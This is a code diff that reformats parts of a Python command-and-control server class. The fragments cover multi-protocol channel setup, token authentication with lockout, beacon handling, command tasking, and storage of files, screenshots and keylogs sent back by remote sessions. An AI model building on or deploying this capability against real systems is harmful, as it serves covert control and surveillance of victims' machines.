@@ -58,7 +58,6 @@ class C2Server(BaseC2):
             "message_received": [],
         }
 
-
     def _initialize_protocols(self):
         """Initialize all supported communication protocols."""
         protocols_config = []
@@ -67,44 +66,66 @@ class C2Server(BaseC2):
         if self.config.get("https_enabled", True):
             https_config = self.config.get("https", {})
             # Use environment variables with fallback to config values
-            https_host = os.environ.get("C2_HTTPS_HOST", https_config.get("host", C2_DEFAULTS["https"]["host"]))
-            https_port = int(os.environ.get("C2_HTTPS_PORT", https_config.get("port", C2_DEFAULTS["https"]["port"])))
+            https_host = os.environ.get(
+                "C2_HTTPS_HOST", https_config.get("host", C2_DEFAULTS["https"]["host"])
+            )
+            https_port = int(
+                os.environ.get(
+                    "C2_HTTPS_PORT", https_config.get("port", C2_DEFAULTS["https"]["port"])
+                )
+            )
 
-            protocols_config.append({
-                "type": "https",
-                "server_url": f"https://{https_host}:{https_port}",
-                "headers": https_config.get("headers", {}),
-                "priority": 1,
-            })
+            protocols_config.append(
+                {
+                    "type": "https",
+                    "server_url": f"https://{https_host}:{https_port}",
+                    "headers": https_config.get("headers", {}),
+                    "priority": 1,
+                }
+            )
 
         # DNS Protocol
         if self.config.get("dns_enabled", False):
             dns_config = self.config.get("dns", {})
             # Use environment variables with fallback to config values
-            dns_domain = os.environ.get("C2_DNS_DOMAIN", dns_config.get("domain", C2_DEFAULTS["dns"]["domain"]))
-            dns_host = os.environ.get("C2_DNS_HOST", dns_config.get("host", C2_DEFAULTS["dns"]["host"]))
-            dns_port = int(os.environ.get("C2_DNS_PORT", dns_config.get("port", C2_DEFAULTS["dns"]["port"])))
+            dns_domain = os.environ.get(
+                "C2_DNS_DOMAIN", dns_config.get("domain", C2_DEFAULTS["dns"]["domain"])
+            )
+            dns_host = os.environ.get(
+                "C2_DNS_HOST", dns_config.get("host", C2_DEFAULTS["dns"]["host"])
+            )
+            dns_port = int(
+                os.environ.get("C2_DNS_PORT", dns_config.get("port", C2_DEFAULTS["dns"]["port"]))
+            )
 
-            protocols_config.append({
-                "type": "dns",
-                "domain": dns_domain,
-                "dns_server": f"{dns_host}:{dns_port}",
-                "priority": 2,
-            })
+            protocols_config.append(
+                {
+                    "type": "dns",
+                    "domain": dns_domain,
+                    "dns_server": f"{dns_host}:{dns_port}",
+                    "priority": 2,
+                }
+            )
 
         # TCP Protocol
         if self.config.get("tcp_enabled", False):
             tcp_config = self.config.get("tcp", {})
             # Use environment variables with fallback to config values
-            tcp_host = os.environ.get("C2_TCP_HOST", tcp_config.get("host", C2_DEFAULTS["tcp"]["host"]))
-            tcp_port = int(os.environ.get("C2_TCP_PORT", tcp_config.get("port", C2_DEFAULTS["tcp"]["port"])))
+            tcp_host = os.environ.get(
+                "C2_TCP_HOST", tcp_config.get("host", C2_DEFAULTS["tcp"]["host"])
+            )
+            tcp_port = int(
+                os.environ.get("C2_TCP_PORT", tcp_config.get("port", C2_DEFAULTS["tcp"]["port"]))
+            )
 
-            protocols_config.append({
-                "type": "tcp",
-                "host": tcp_host,
-                "port": tcp_port,
-                "priority": 3,
-            })
+            protocols_config.append(
+                {
+                    "type": "tcp",
+                    "host": tcp_host,
+                    "port": tcp_port,
+                    "priority": 3,
+                }
+            )
 
         # Use base class method
         self.initialize_protocols(protocols_config, self.encryption_manager)
@@ -155,7 +176,9 @@ class C2Server(BaseC2):
                 if attempts_info["count"] >= self.max_auth_attempts:
                     lockout_time = time.time() - attempts_info["last_attempt"]
                     if lockout_time < self.auth_lockout_duration:
-                        self.logger.warning(f"Authentication blocked for {remote_addr} - lockout active")
+                        self.logger.warning(
+                            f"Authentication blocked for {remote_addr} - lockout active"
+                        )
                         return False
                     # Reset after lockout expires
                     del self.failed_auth_attempts[remote_addr]
@@ -176,11 +199,17 @@ class C2Server(BaseC2):
             self.failed_auth_attempts[remote_addr]["count"] += 1
             self.failed_auth_attempts[remote_addr]["last_attempt"] = time.time()
 
-            remaining_attempts = self.max_auth_attempts - self.failed_auth_attempts[remote_addr]["count"]
+            remaining_attempts = (
+                self.max_auth_attempts - self.failed_auth_attempts[remote_addr]["count"]
+            )
             if remaining_attempts > 0:
-                self.logger.warning(f"Failed auth from {remote_addr} - {remaining_attempts} attempts remaining")
+                self.logger.warning(
+                    f"Failed auth from {remote_addr} - {remaining_attempts} attempts remaining"
+                )
             else:
-                self.logger.warning(f"Failed auth from {remote_addr} - locked out for {self.auth_lockout_duration} seconds")
+                self.logger.warning(
+                    f"Failed auth from {remote_addr} - locked out for {self.auth_lockout_duration} seconds"
+                )
 
             return False
 
@@ -272,12 +301,16 @@ class C2Server(BaseC2):
             # Check for authentication token
             auth_token = connection_info.get("auth_token")
             if not auth_token:
-                self.logger.warning(f"Connection rejected - no authentication token from {connection_info.get('remote_addr')}")
+                self.logger.warning(
+                    f"Connection rejected - no authentication token from {connection_info.get('remote_addr')}"
+                )
                 return None
 
             # Verify authentication token
             if not await self._verify_auth_token(auth_token, connection_info.get("remote_addr")):
-                self.logger.warning(f"Connection rejected - invalid authentication token from {connection_info.get('remote_addr')}")
+                self.logger.warning(
+                    f"Connection rejected - invalid authentication token from {connection_info.get('remote_addr')}"
+                )
                 return None
 
             # Authentication successful - create session
@@ -290,7 +323,9 @@ class C2Server(BaseC2):
             # Trigger event handlers
             await self._trigger_event("session_connected", session)
 
-            self.logger.info(f"Authenticated connection established with {connection_info.get('remote_addr')}")
+            self.logger.info(
+                f"Authenticated connection established with {connection_info.get('remote_addr')}"
+            )
             return session
 
         except Exception as e:
@@ -349,11 +384,14 @@ class C2Server(BaseC2):
     async def _handle_protocol_error(self, protocol_name: str, error: Exception):
         """Handle protocol-specific errors."""
         self.logger.error(f"Protocol {protocol_name} error: {error}")
-        await self._trigger_event("error_occurred", {
-            "type": "protocol_error",
-            "protocol": protocol_name,
-            "error": str(error),
-        })
+        await self._trigger_event(
+            "error_occurred",
+            {
+                "type": "protocol_error",
+                "protocol": protocol_name,
+                "error": str(error),
+            },
+        )
 
     async def _handle_beacon(self, session, message: dict[str, Any]):
         """Handle beacon message from client."""
@@ -379,10 +417,13 @@ class C2Server(BaseC2):
                     await self.session_manager.mark_task_sent(task["task_id"])
 
             # Trigger event
-            await self._trigger_event("beacon_received", {
-                "session": session,
-                "beacon_data": beacon_data,
-            })
+            await self._trigger_event(
+                "beacon_received",
+                {
+                    "session": session,
+                    "beacon_data": beacon_data,
+                },
+            )
 
         except Exception as e:
             self.logger.error(f"Error handling beacon: {e}")
@@ -401,12 +442,15 @@ class C2Server(BaseC2):
             self.stats["commands_executed"] += 1
 
             # Trigger event
-            await self._trigger_event("command_executed", {
-                "session": session,
-                "task_id": task_id,
-                "result": result,
-                "success": success,
-            })
+            await self._trigger_event(
+                "command_executed",
+                {
+                    "session": session,
+                    "task_id": task_id,
+                    "result": result,
+                    "success": success,
+                },
+            )
 
         except Exception as e:
             self.logger.error(f"Error handling task result: {e}")
@@ -420,7 +464,9 @@ class C2Server(BaseC2):
 
             # Store uploaded file
             await self.session_manager.store_uploaded_file(
-                session.session_id, filename, file_data,
+                session.session_id,
+                filename,
+                file_data,
             )
 
             # Update statistics
@@ -439,7 +485,9 @@ class C2Server(BaseC2):
 
             # Store screenshot
             await self.session_manager.store_screenshot(
-                session.session_id, screenshot_data, timestamp,
+                session.session_id,
+                screenshot_data,
+                timestamp,
             )
 
             self.logger.info(f"Received screenshot from session {session.session_id}")
@@ -455,7 +503,9 @@ class C2Server(BaseC2):
 
             # Store keylog data
             await self.session_manager.store_keylog_data(
-                session.session_id, keylog_data, timestamp,
+                session.session_id,
+                keylog_data,
+                timestamp,
             )
 
             self.logger.debug(f"Received keylog data from session {session.session_id}")
@@ -490,7 +540,8 @@ class C2Server(BaseC2):
                 # Process pending commands from queue
                 try:
                     command = await asyncio.wait_for(
-                        self.command_queue.get(), timeout=1.0,
+                        self.command_queue.get(),
+                        timeout=1.0,
                     )
                     await self._process_command(command)
                 except asyncio.TimeoutError as e:
@@ -515,7 +566,9 @@ class C2Server(BaseC2):
 
             # Create task for the command
             task = await self.session_manager.create_task(
-                session_id, command_type, command_data,
+                session_id,
+                command_type,
+                command_data,
             )
 
             self.logger.info(f"Created task {task['task_id']} for session {session_id}")
@@ -554,7 +607,9 @@ class C2Server(BaseC2):
 
     # Public API methods
 
-    async def send_command(self, session_id: str, command_type: str, command_data: dict[str, Any] = None):
+    async def send_command(
+        self, session_id: str, command_type: str, command_data: dict[str, Any] = None
+    ):
         """Send a command to a specific session."""
         command = {
             "session_id": session_id,
@@ -691,8 +746,13 @@ class C2Server(BaseC2):
         return {
             "auth_enabled": True,
             "token_count": len(self.auth_tokens),
-            "locked_out_ips": len([ip for ip, info in self.failed_auth_attempts.items()
-                                   if info["count"] >= self.max_auth_attempts]),
+            "locked_out_ips": len(
+                [
+                    ip
+                    for ip, info in self.failed_auth_attempts.items()
+                    if info["count"] >= self.max_auth_attempts
+                ]
+            ),
             "max_attempts": self.max_auth_attempts,
             "lockout_duration": self.auth_lockout_duration,
         }
